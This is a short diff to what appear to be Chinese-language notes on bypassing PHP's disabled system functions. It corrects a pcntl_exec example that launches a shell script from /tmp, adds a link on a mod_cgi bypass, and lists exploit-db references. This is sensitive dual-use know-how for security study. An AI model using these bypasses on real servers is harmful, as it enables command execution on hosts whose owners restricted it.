@@ -37,7 +37,7 @@ http://www.cnseay.com/2632/comment-page-1/
 
 ```
 #exec.php
-<?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>
+<?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>
 #/tmp/b4dboy.sh
 #!/bin/bash
 ls -l /
@@ -58,6 +58,10 @@ https://www.exploit-db.com/exploits/4517/
 ##### win_shell_execute
 
 https://www.exploit-db.com/exploits/4218/
+
+##### Bypass PHP system functions disabled via mod_cgi
+
+http://0cx.cc/bypass_disabled_via_mod_cgi.jspx
 
 ### 防御
 dl
